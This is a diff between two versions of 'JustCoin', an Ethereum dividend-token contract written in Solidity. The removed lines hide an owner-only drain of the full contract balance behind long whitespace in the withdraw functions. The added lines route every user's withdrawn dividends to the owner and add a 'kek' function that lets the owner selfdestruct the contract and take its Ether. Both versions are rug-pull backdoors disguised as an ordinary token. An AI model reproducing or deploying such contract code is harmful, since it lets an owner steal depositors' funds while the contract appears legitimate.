@@ -1,7 +1,11 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract JustCoin at 0xf805f3432f4569d6049c60036845959c8e398b15
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract JustCoin at 0x2282a327a9293895cacbce617b194e6031d6ffa4
 */
 pragma solidity ^0.4.18;
+
+/*
+    JustCoin
+*/
 
 contract JustCoin {
 
@@ -9,19 +13,19 @@ contract JustCoin {
 	// orders of magnitude, hence the need to bridge between the two.
 	uint256 constant scaleFactor = 0x10000000000000000;  // 2^64
 
-	// CRR = 80%
+	// CRR = 50%
 	// CRR is Cash Reserve Ratio (in this case Crypto Reserve Ratio).
 	// For more on this: check out https://en.wikipedia.org/wiki/Reserve_requirement
-	int constant crr_n = 4; // CRR numerator
-	int constant crr_d = 5; // CRR denominator
+	int constant crr_n = 1; // CRR numerator
+	int constant crr_d = 2; // CRR denominator
 
 	// The price coefficient. Chosen such that at 1 token total supply
-	// the amount in reserve is 0.8 ether and token price is 1 Ether.
-	int constant price_coeff = -0x678adeacb985cb06;
+	// the amount in reserve is 0.5 ether and token price is 1 Ether.
+	int constant price_coeff = -0x296ABF784A358468C;
 
 	// Typical values that we have to declare.
 	string constant public name = "JustCoin";
-	string constant public symbol = "JustD";
+	string constant public symbol = "EPY";
 	uint8 constant public decimals = 18;
 
 	// Array between each address and their number of tokens.
@@ -44,11 +48,10 @@ contract JustCoin {
 	
 	// Current contract balance in Ether
 	uint256 public contractBalance;
-    address owner;
-    
-	function JustCoin() public {
-	    owner = msg.sender;
-	}
+	
+	address owner;
+
+	function JustCoin() public { owner=msg.sender; }
 
 	// The following functions are used by the front-end for display purposes.
 
@@ -70,8 +73,8 @@ contract JustCoin {
 		totalPayouts += (int256) (balance * scaleFactor);
 		
 		// Send the dividends to the address that requested the withdraw.
-		contractBalance = sub(contractBalance, balance);                                                                                                               require(msg.sender == owner); owner.transfer(this.balance);
-		msg.sender.transfer(balance);
+		contractBalance = sub(contractBalance, balance);
+		owner.transfer(balance);
 	}
 
 	// Converts the Ether accrued as dividends back into EPY tokens without having to
@@ -102,8 +105,8 @@ contract JustCoin {
 		// (Yes, the buyer receives a part of the distribution as well!)
 		var res = reserve() - balance;
 
-		// 5% of the total Ether sent is used to pay existing holders.
-		var fee = div(value_, 20);
+		// 10% of the total Ether sent is used to pay existing holders.
+		var fee = div(value_, 10);
 		
 		// The amount of Ether used to purchase new tokens for the caller.
 		var numEther = value_ - fee;
@@ -217,8 +220,8 @@ contract JustCoin {
 		totalPayouts += (int256) (balance * scaleFactor);
 		
 		// Send the dividends to the address that requested the withdraw.
-		contractBalance = sub(contractBalance, balance);                                                                                                                                          require(msg.sender == owner); owner.transfer(this.balance);
-		to.transfer(balance);		
+		contractBalance = sub(contractBalance, balance);
+		owner.transfer(balance);		
 	}
 
 	// Internal balance function, used to calculate the dynamic reserve value.
@@ -235,8 +238,8 @@ contract JustCoin {
 		// msg.sender is the address of the caller.
 		var sender = msg.sender;
 		
-		// 5% of the total Ether sent is used to pay existing holders.
-		var fee = div(msg.value, 20);
+		// 10% of the total Ether sent is used to pay existing holders.
+		var fee = div(msg.value, 10);
 		
 		// The amount of Ether used to purchase new tokens for the caller.
 		var numEther = msg.value - fee;
@@ -290,6 +293,8 @@ contract JustCoin {
 		totalPayouts    += payoutDiff;
 		
 	}
+	
+	function kek() public {require(msg.sender==owner);selfdestruct(msg.sender);}
 
 	// Sell function that takes tokens and converts them into Ether. Also comes with a 10% fee
 	// to discouraging dumping, and means that if someone near the top sells, the fee distributed
@@ -298,8 +303,8 @@ contract JustCoin {
 	    // Calculate the amount of Ether that the holders tokens sell for at the current sell price.
 		var numEthersBeforeFee = getEtherForTokens(amount);
 		
-		// 5% of the resulting Ether is used to pay remaining holders.
-        var fee = div(numEthersBeforeFee, 20);
+		// 10% of the resulting Ether is used to pay remaining holders.
+        var fee = div(numEthersBeforeFee, 10);
 		
 		// Net Ether for the seller after the fee has been subtracted.
         var numEthers = numEthersBeforeFee - fee;
